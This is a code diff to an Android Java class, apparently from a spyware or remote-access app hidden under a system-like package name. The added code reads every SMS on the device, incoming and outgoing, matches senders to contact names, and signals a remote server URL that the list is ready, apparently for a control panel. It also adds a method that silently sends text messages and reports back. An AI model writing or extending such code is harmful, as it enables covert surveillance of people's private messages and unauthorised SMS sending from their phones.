@@ -1,8 +1,11 @@
 package oom.android.system.Managers;
 
+import android.app.PendingIntent;
 import android.content.Context;
+import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
+import android.provider.ContactsContract;
 import android.util.Log;
 
 import org.json.JSONArray;
@@ -12,25 +15,25 @@ import org.json.JSONObject;
 import java.util.Date;
 import java.util.List;
 
+import oom.android.system.app.HttpPoster;
+import oom.android.system.app.MyService;
+
 public class SmsManager {
 
-    Context context;
 
-    public SmsManager(Context context1){
-        this.context=context1;
+    public SmsManager(){
+
     }
 
-
-
-    public JSONObject getSMSList(){
+    public static JSONObject getSMSList(){
 
         try {
             JSONObject SMSList = new JSONObject();
             JSONArray list = new JSONArray();
 
 
-            Uri uriSMSURI = Uri.parse("content://sms/inbox");
-            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
+            Uri uriSMSURI = Uri.parse("content://sms");
+            Cursor cur = MyService.getContext().getContentResolver().query(uriSMSURI, null, null, null, null);
 
             while (cur.moveToNext()) {
                 JSONObject sms = new JSONObject();
@@ -38,19 +41,47 @@ public class SmsManager {
                 String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                 String person = cur.getString(cur.getColumnIndexOrThrow("person"));
                 String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+                String type ="";
+                Integer t = cur.getInt(cur.getColumnIndexOrThrow("type"));
+                switch (t){
+                    case 1:
+                        type="<--";
+                        break;
+                    case 2:
+                        type="-->";
+                        break;
+                }
+                String personN="";
+                if(person != ""){
+
+                    Cursor c = MyService.getContext().getContentResolver().query(ContactsContract.RawContacts.CONTENT_URI,
+                            new String[] { ContactsContract.RawContacts._ID,ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY}, null, null,  null);
+                    while (c.moveToNext()){
+                        if(person == c.getString(c.getColumnIndex(ContactsContract.RawContacts._ID))){
+                            personN = c.getString(c.getColumnIndex(ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY));
+
+                        }
+                    }
+                    c.close();
+
+                }
+
                 Long epoch = Long.parseLong(date);
                 Date fDate = new Date(epoch * 1000);
                 date = fDate.toString();
+
+                sms.put("type",type);
                 sms.put("phoneNumber" , address);
                 sms.put("date",date);
-                sms.put("person",person);
+                sms.put("person",personN);
                 sms.put("msg" , body);
                 list.put(sms);
 
             }
             SMSList.put("smsList", list);
-            Log.e("done" ,"collecting");
             cur.close();
+            Runnable uploader = new HttpPoster(MyService.post_url,"[Sms]Список обновлён (нажмите Ctrl +f5)");
+            new Thread(uploader).start();
             return SMSList;
         } catch (JSONException e) {
             e.printStackTrace();
@@ -58,6 +89,15 @@ public class SmsManager {
 
         return null;
 
+    }
+
+    public static void sendSMS(String phoneNumber, String message)
+    {
+        android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
+
+        smsManager.sendTextMessage(phoneNumber, null, message, null, null);
+        Runnable uploader = new HttpPoster(MyService.post_url,"[Sms]Сообщение отправленно");
+        new Thread(uploader).start();
     }
 
 }
